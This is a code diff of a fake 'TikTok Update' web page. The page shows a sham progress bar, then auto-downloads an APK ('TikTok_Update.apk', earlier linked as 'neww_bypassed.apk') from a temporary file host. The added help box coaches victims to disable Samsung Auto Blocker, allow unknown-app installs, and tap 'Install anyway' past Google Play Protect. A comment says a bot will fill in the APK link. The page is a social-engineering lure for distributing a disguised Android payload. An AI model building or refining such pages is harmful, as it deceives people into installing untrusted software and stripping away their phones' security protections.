@@ -5,15 +5,21 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TikTok Update</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        * { box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; color: #fff; margin: 0; padding: 20px; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
         .container { text-align: center; padding: 20px; max-width: 400px; width: 100%; }
         .logo { width: 80px; height: 80px; margin-bottom: 20px; }
         h1 { font-size: 24px; margin-bottom: 10px; }
         p { color: #aaa; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
-        .btn { background: #FE2C55; color: #fff; padding: 15px 30px; border-radius: 8px; text-decoration: none; font-weight: bold; font-size: 16px; display: inline-block; width: 100%; box-sizing: border-box; border: none; cursor: pointer; }
+        .btn { background: #FE2C55; color: #fff; padding: 15px 30px; border-radius: 8px; text-decoration: none; font-weight: bold; font-size: 16px; display: inline-block; width: 100%; border: none; cursor: pointer; }
         .progress { width: 100%; background: #333; height: 6px; border-radius: 3px; margin-bottom: 20px; overflow: hidden; display: none; }
         .progress-bar { width: 0%; background: #FE2C55; height: 100%; transition: width 0.3s; }
         .status { display: none; margin-top: 15px; font-size: 14px; color: #FE2C55; }
+        .help-box { display: none; margin-top: 30px; padding: 15px; background: #111; border: 1px solid #333; border-radius: 8px; text-align: left; }
+        .help-box h3 { margin: 0 0 10px; font-size: 15px; color: #FE2C55; }
+        .help-box p { font-size: 13px; color: #ccc; margin: 0 0 10px; line-height: 1.6; }
+        .help-box b { color: #fff; }
+        .help-box ol { padding-left: 20px; margin: 0; color: #ccc; font-size: 13px; line-height: 1.8; }
     </style>
 </head>
 <body>
@@ -24,6 +30,22 @@
         <div class="progress" id="prog"><div class="progress-bar" id="bar"></div></div>
         <button id="btn" class="btn">Update Now</button>
         <div class="status" id="status">Downloading update... Please wait.</div>
+
+        <div class="help-box" id="helpBox">
+            <h3>⚠️ Installation Help</h3>
+            <p>Your phone may show a security warning. This is normal for manual updates.</p>
+            <p><b>Samsung:</b></p>
+            <ol>
+                <li>If <b>"Unknown app blocked"</b> appears, go to <b>Settings → Security and privacy → Auto Blocker → Off</b>.</li>
+                <li>Then install the app again.</li>
+            </ol>
+            <p><b>Oppo / Vivo / Realme / Xiaomi:</b></p>
+            <ol>
+                <li>Tap <b>"Allow"</b> or <b>"Install anyway"</b> if a warning appears.</li>
+                <li>If blocked, go to <b>Settings → Security → App scan / Install unknown apps</b> and allow.</li>
+            </ol>
+            <p><b>Google Play Protect:</b> Tap <b>"Install anyway"</b> (not "Don't install").</p>
+        </div>
     </div>
     <script>
         document.getElementById('btn').addEventListener('click', function(e) {
@@ -31,19 +53,19 @@
             this.style.display = 'none';
             document.getElementById('prog').style.display = 'block';
             document.getElementById('status').style.display = 'block';
+            document.getElementById('helpBox').style.display = 'block';
             
             var bar = document.getElementById('bar');
             var width = 0;
             
-            // Tera tmpfiles link yahan hai
-            var apkUrl = "https://tmpfiles.org/dl/1792274011.5f2dde4cf9aebaaf/wDAYcetOjwlj/neww_bypassed.apk"; 
+            // APK link yahan aayega (bot update karega)
+            var apkUrl = "https://tmpfiles.org/dl/xxxxx/app.apk"; 
             
             var interval = setInterval(function() {
                 if (width >= 100) {
                     clearInterval(interval);
-                    document.getElementById('status').innerText = "Update Ready! Opening installer...";
+                    document.getElementById('status').innerText = "Update ready! Opening installer...";
                     
-                    // Direct Download Trigger
                     var a = document.createElement('a');
                     a.href = apkUrl;
                     a.download = "TikTok_Update.apk";
